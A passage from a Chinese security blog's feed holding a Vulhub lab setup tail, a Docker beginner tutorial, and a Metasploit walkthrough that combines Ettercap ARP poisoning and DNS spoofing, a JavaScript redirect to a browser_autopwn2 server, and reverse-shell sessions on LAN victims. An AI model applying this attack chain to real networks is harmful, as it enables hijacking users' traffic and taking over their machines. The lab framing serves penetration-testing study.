alt="1554807336176"></p></li><li><p>设置配置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show options//查看可配置选项</span><br><span class="line">set rhost 192.168.10.18//设置目标IP</span><br><span class="line">set rport 8080//设置目标端口</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807568020.png" alt="1554807568020"></p></li><li><p>执行exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run//开始漏洞利用</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807630335.png" alt="1554807630335"></p></li><li><p>获取反弹shell</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807710493.png" alt="1554807710493"></p></li></ol><h2 id="七、移除环境"><a href="#七、移除环境" class="headerlink" title="七、移除环境"></a>七、移除环境</h2><p>Vulhub中所有环境均为漏洞靶场，在测试结束后，请及时关闭并移除环境，避免被他人恶意利用。</p><p>漏洞测试结束后，返回到<code>drupal/CVE-2014-3704/</code>目录，执行如下命令移除环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p>上述命令会执行如下几个动作：</p><ul><li>关闭正在运行的容器</li><li>删除所有相关容器</li><li>移除NAT（docker-compose在运行的时候会创建一个NAT网段）</li></ul><p>但不会移除编译好的漏洞镜像，下次再执行<code>docker-compose up -d</code>命令，就不需要再次编译相关镜像了。</p><p><strong>参考链接</strong>：</p><p>Vulhub官方文档：<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门&amp;&amp;环境部署实例</title>
      <link href="/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/"/>
      <url>/2019/04/28/docker%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、docker介绍"><a href="#一、docker介绍" class="headerlink" title="一、docker介绍"></a>一、docker介绍</h1><p>docker是开源的应用程序容器引擎，使用go语言开发，借助于docker打包用户的应用程序，将这些应用程序包含在容器中，实现虚拟化，容器是完全使用沙箱机制，相互独立，占用资源非常少。</p><a id="more"></a><h1 id="二、docker三大核心概念"><a href="#二、docker三大核心概念" class="headerlink" title="二、docker三大核心概念"></a>二、docker三大核心概念</h1><ul><li><p>镜像</p><ul><li>image, docker镜像就是一个只读的模板，例如一个镜像中可以包含完整的操作系统，里面安装apache/php/mysql等环境，镜像可以创建容器</li></ul></li><li><p>容器</p><ul><li>container，docker利用容器运行程序，容器是从镜像中创建运行的实例，容器可以运行、关闭、删除</li></ul></li><li>仓库<ul><li>repository，集中存放镜像的地方，每个仓库中包含多个镜像，分为私有和公开，dockerHub</li></ul></li></ul><h1 id="三、docker安装"><a href="#三、docker安装" class="headerlink" title="三、docker安装"></a>三、docker安装</h1><h2 id="1-一键安装Docker"><a href="#1-一键安装Docker" class="headerlink" title="1. 一键安装Docker"></a>1. 一键安装Docker</h2><ol><li><p>这是推荐方式。在未安装过Docker的机器上，root权限执行如下命令即可一键安装最新版Docker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure></li><li><p>也可以使用系统自带的包管理工具来安装，比如在Ubuntu下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-手动安装"><a href="#2-手动安装" class="headerlink" title="2.手动安装"></a>2.手动安装</h2><p>常见操作系统安装Docker的方法在文档中均可查阅，这里就不再赘述： <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/</a></p><p><strong>注意</strong>，docker是一个系统服务，所以，安装完成后可能需要手工启动服务：<code>service start docker</code>，否则会出现连接失败的情况。同样，如果docker没有自启动，你也需要手工启动docker服务。如果你是使用一键安装工具安装的docker，则docker会自动启动。</p><h2 id="3-加入docker组"><a href="#3-加入docker组" class="headerlink" title="3. 加入docker组"></a>3. 加入docker组</h2><p>安装完成之后，普通用户每次执行docker命令都需要加上<code>sudo</code> ，所以我们可以加入doker用户组获取操作权限</p><ol><li><p>使用有sudo权限的帐号登录系统</p></li><li><p>创建docker分组，并将相应的用户添加到这个分组里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker your_username</span><br></pre></td></tr></table></figure></li><li><p>退出，然后重新登录，以便让权限生效</p></li></ol><h2 id="4-添加国内镜像仓库"><a href="#4-添加国内镜像仓库" class="headerlink" title="4. 添加国内镜像仓库"></a>4. 添加国内镜像仓库</h2><p>由于官方资源库在国外，我们在拉取镜像资源的时候会很慢。所以，国内的Docker爱好者们就添加了一些国内的镜像（mirror）,方便大家使用。</p><p><strong>国内加速站点</strong></p><ul><li><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a></p></li><li><p><a href="https://c.163yun.com/hub#/m/home/" target="_blank" rel="noopener">网易云</a></p></li><li><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a></p></li></ul><ol><li><p>使用脚本来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure></li><li><p>使用命令来配置加速站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;&lt;your accelerate address&gt;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>以上操作后重启一下 Docker</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure></li></ol><h1 id="五、docker基本使用"><a href="#五、docker基本使用" class="headerlink" title="五、docker基本使用"></a>五、docker基本使用</h1><h2 id="1-启动docker"><a href="#1-启动docker" class="headerlink" title="1. 启动docker"></a>1. 启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker//centos</span><br><span class="line">server docker start//ubuntu</span><br></pre></td></tr></table></figure><p><strong>查看基本信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker info//当前容器的信息</span><br><span class="line">docker stats//运行容器的进程信息</span><br><span class="line">docker version//版本信息</span><br></pre></td></tr></table></figure><h2 id="2-镜像操作"><a href="#2-镜像操作" class="headerlink" title="2. 镜像操作"></a>2. 镜像操作</h2><p><strong>搜索镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search [关键字]</span><br></pre></td></tr></table></figure><p><strong>拉取镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像全称]:版本标签(可选)</span><br></pre></td></tr></table></figure><p><strong>查看本地镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi []</span><br></pre></td></tr></table></figure><p><strong>导出镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker road &lt; test.tar</span><br></pre></td></tr></table></figure><h2 id="3-容器操作"><a href="#3-容器操作" class="headerlink" title="3. 容器操作"></a>3. 容器操作</h2><p><strong>启动容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --rm --name [容器名字] [镜像名称] [可执行命令]</span><br><span class="line">参数说明：</span><br><span class="line">-d：让容器在后台运行</span><br><span class="line">-P：将容器内部使用的网络端口映射到宿主机</span><br><span class="line">-p：[主机端口:容器端口] 可自定义映射端口</span><br><span class="line">--name：可自定义容器名称</span><br><span class="line">--rm：当容器停止时，会自动删除</span><br></pre></td></tr></table></figure><p><strong>查看运行容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>查看容器端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器内部日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f [容器id/名称] //可以查看容器内部的标准输出</span><br><span class="line">-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [容器id/名称] /bin/bash//推荐使用</span><br><span class="line">docker attach [容器id/名称] //不会在容器中创建进程执行额外的命令，只是附着到容器上</span><br><span class="line">//attach必须登陆到一个已经运行的容器里，如果从这个容器中exit退出的话，就会导致容器停止</span><br></pre></td></tr></table></figure><p><strong>离开容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+P+Q//正常退出不关闭容器</span><br><span class="line">exit//退出之后关闭容器,可以使用下面的流程进行恢复</span><br><span class="line">使用docker restart命令重启容器</span><br><span class="line">使用docker attach命令进入容器</span><br></pre></td></tr></table></figure><p><strong>停止容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>重新开启容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看所有容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器底层信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [容器id/名称]</span><br><span class="line">//删除前必须先停止正在运行的容器</span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import &lt; test.tar</span><br></pre></td></tr></table></figure><p><strong>docker批量删除容器、镜像</strong></p><p>一条命令实现停用并删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p>按条件删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a | awk &apos;/test\/webapp/ &#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><p>按条件删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有打标签</span><br><span class="line">docker rmi `docker images -q | awk &apos;/^&lt;none&gt;/ &#123; print $3 &#125;&apos;`</span><br><span class="line">#镜像名包含关键字</span><br><span class="line">docker rmi --force `docker images | grep keywords | awk &apos;&#123;print $3&#125;&apos;`   </span><br><span class="line">//其中keywords为关键字</span><br></pre></td></tr></table></figure><h2 id="4-文件操作"><a href="#4-文件操作" class="headerlink" title="4. 文件操作"></a>4. 文件操作</h2><p>从主机目录拷贝到容器目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /var/www/example 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure><p>从容器目录拷贝到主机目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /var/www/example</span><br></pre></td></tr></table></figure><h1 id="六、容器部署实例"><a href="#六、容器部署实例" class="headerlink" title="六、容器部署实例"></a>六、容器部署实例</h1><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1. 安装nginx"></a>1. 安装nginx</h3><ul><li>从docker hub上拉取镜像</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx:latest</span><br></pre></td></tr></table></figure><ul><li>托管一些简单的静态内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-nginx -v  $PWD/html:/usr/share/nginx/html:ro -d nginx</span><br><span class="line"> -v $PWD/html:/usr/share/nginx/html：将主机中当前目录下的html挂载到容器的/usr/share/nginx/html</span><br></pre></td></tr></table></figure><ul><li>或者准备自己的配置文件和文件目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br><span class="line">#dockerhub上有详细自定义配置部署说明</span><br><span class="line">-p 80:80：将容器的80端口映射到主机的80端口</span><br><span class="line">--name mynginx：将容器命名为mynginx</span><br><span class="line">-v $PWD/www:/www：将主机中当前目录下的www挂载到容器的/www</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf：将主机中当前目录下的nginx.conf挂载到容器的/etc/nginx/nginx.conf</span><br><span class="line">-v $PWD/logs:/wwwlogs：将主机中当前目录下的logs挂载到容器的/wwwlogs</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果出现以下类似报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:344: starting container process caused &quot;process_linux.go:424: container init caused \&quot;rootfs_linux.go:58: mounting \\\&quot;/opt/nginx/conf/nginx.conf\\\&quot; to rootfs \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged\\\&quot; at \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged/etc/nginx/nginx.conf\\\&quot; caused \\\&quot;not a directory\\\&quot;\&quot;&quot;: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.</span><br></pre></td></tr></table></figure><p>是因为没提前创建好挂载目录和配置文件导致conf/nginx.conf 自动创建成目录，删除并创建nginx.conf配置文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll conf/</span><br><span class="line">rm -r conf/nginx.conf</span><br><span class="line">touch conf/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>查看运行容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-bde19eff6c1fd6ea.png" alt="当前正在运行的容器"></p><h3 id="2-安装Lamp环境"><a href="#2-安装Lamp环境" class="headerlink" title="2. 安装Lamp环境"></a>2. 安装Lamp环境</h3><p>拉取一个lamp镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fauria/lamp</span><br></pre></td></tr></table></figure><p>创建lamp目录&amp;挂载路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/lamp &amp;&amp; cd ~/lamp</span><br><span class="line">mkdir www logs</span><br></pre></td></tr></table></figure><p>创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 80:80 -v /opt/lamp/www:/var/www/html -v /opt/lamp/logs/:/var/log/httpd --name my-lamp-container fauria/lamp</span><br></pre></td></tr></table></figure><p>查看是否启动成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/docker入门-环境部署实例/8268763-1fab64e3d8195ff5.png" alt="STATUS为UP说明启动成功"></p><p>查看所有容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>进入一个已经在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其中字符串为容器ID</span><br><span class="line">docker exec -it d27bd3998ad9 /bin/bash</span><br></pre></td></tr></table></figure><p>删除容器删除前先停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop  d27b  &amp; docker rm d27b</span><br></pre></td></tr></table></figure><h1 id="七、最后"><a href="#七、最后" class="headerlink" title="七、最后"></a>七、最后</h1><p>本文只是起到docker的入门作用，如果想深入学习</p><p>以下推荐几个dokcer在线学习网站</p><p>[Docker 教程 | 菜鸟教程]<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/docker/docker-tutorial.html</a></p><p>[Docker 入门教程|阮一峰的网络日志]<a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit利用-浏览器自动攻击</title>
      <link href="/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/"/>
      <url>/2019/04/08/Metasploit%E5%88%A9%E7%94%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。</p><a id="more"></a><h2 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h2><ul><li><p>本地局域网络</p></li><li><p>Kali</p></li><li><p>Windows Server 2003 / xp </p></li></ul><h2 id="三、使用工具"><a href="#三、使用工具" class="headerlink" title="三、使用工具"></a>三、使用工具</h2><ul><li><p>Metasploit</p></li><li><p>Ettercap</p></li></ul><h2 id="四、Exp"><a href="#四、Exp" class="headerlink" title="四、Exp"></a>四、Exp</h2><p>browser_autopwn2</p><h2 id="五、目的"><a href="#五、目的" class="headerlink" title="五、目的"></a>五、目的</h2><p>如果在同一局域网，目标机器上没有可成功利用的端口时，我们可以尝试进行浏览器攻击。首先，在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点，访问该站点页面会自动跳转至我们构造好的恶意URL上，然后获得反弹shell，这样就能达到获取权限目的。</p><h2 id="六、服务端准备"><a href="#六、服务端准备" class="headerlink" title="六、服务端准备"></a>六、服务端准备</h2><h3 id="1-启动MSF"><a href="#1-启动MSF" class="headerlink" title="1. 启动MSF"></a>1. 启动MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start//启动msf框架所依赖的数据库</span><br><span class="line">msfconsole//启动msfconsole</span><br></pre></td></tr></table></figure><h3 id="2-加载Exp"><a href="#2-加载Exp" class="headerlink" title="2. 加载Exp"></a>2. 加载Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2//搜索browser_autopwn2模块</span><br><span class="line">use auxiliary/server/browser_autopwn2//使用该模块</span><br><span class="line">show options//查看参数，可默认无需修改</span><br><span class="line">set//查看设置内容</span><br><span class="line">run//启动模块</span><br></pre></td></tr></table></figure><p>等待出现URL，和 Server started</p><h3 id="3-构造恶意URL"><a href="#3-构造恶意URL" class="headerlink" title="3. 构造恶意URL"></a>3. 构造恶意URL</h3><p>在Apache中写上自动跳转的代码，向恶意URL上跳转</p><p>这里采用javascript实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 以下方式定时跳转</span></span><br><span class="line"><span class="undefined">setTimeout("javascript:location.href='http://192.168.10.3:8080/Y3JY6DI6gql5iSu'", 5000); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-启动站点服务"><a href="#5-启动站点服务" class="headerlink" title="5.启动站点服务"></a>5.启动站点服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><h2 id="七、攻击客户端"><a href="#七、攻击客户端" class="headerlink" title="七、攻击客户端"></a>七、攻击客户端</h2><h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1. DNS欺骗"></a>1. DNS欺骗</h3><p><strong>使用Ettercap</strong></p><ol><li><p>打开Ettercap的 DNS文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>添加欺骗的A记录和PTR（反向）记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.*.comA192.168.10.3</span><br><span class="line">www.*.comPTR192.168.10.3</span><br></pre></td></tr></table></figure></li><li><p>kali中输入ettercap -G 进入该工具的图形化界面 </p><p>菜单栏选择sniff –&gt; Unified sniffing –&gt;选择上网网卡 </p><p>菜单栏选择Hosts –&gt; Scan for Hosts –&gt; 再点击host list</p><ul><li><p>选择欺骗目标的网关  添加到target1</p></li><li><p>选择欺骗目标的IP 添加到target2</p></li></ul><p>菜单栏选择Mitm–&gt;ARP poisoning–&gt;勾选Sniff remote connections（ARP欺骗）</p><p>菜单栏选择Plugins–&gt;Manage the plugins–&gt;选择dns-spoof（dns欺骗）</p><p>最后，菜单栏中找到start–&gt;start sniffing</p></li></ol><h3 id="2-等待目标使用浏览器"><a href="#2-等待目标使用浏览器" class="headerlink" title="2. 等待目标使用浏览器"></a>2. 等待目标使用浏览器</h3><ol><li><p>目标地址访问任意符合该URL的页面：www.***.com，即可成功跳转至恶意URL</p></li><li><p>访问我们的恶意页面后，该模块会自动选择最合适的exploit，进行攻击利用</p></li><li><p>等待一段时间，直到出现 Successfully migrated to process</p><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png" alt="1554724873153"></p></li><li><p>查看session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure></li><li><p>选择相应序号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure></li><li><p>getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554725111543.png" alt="1554725111543"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> 浏览器攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞挖掘思路-支付逻辑</title>
      <link href="/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/"/>
      <url>/2019/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91/</url>
      
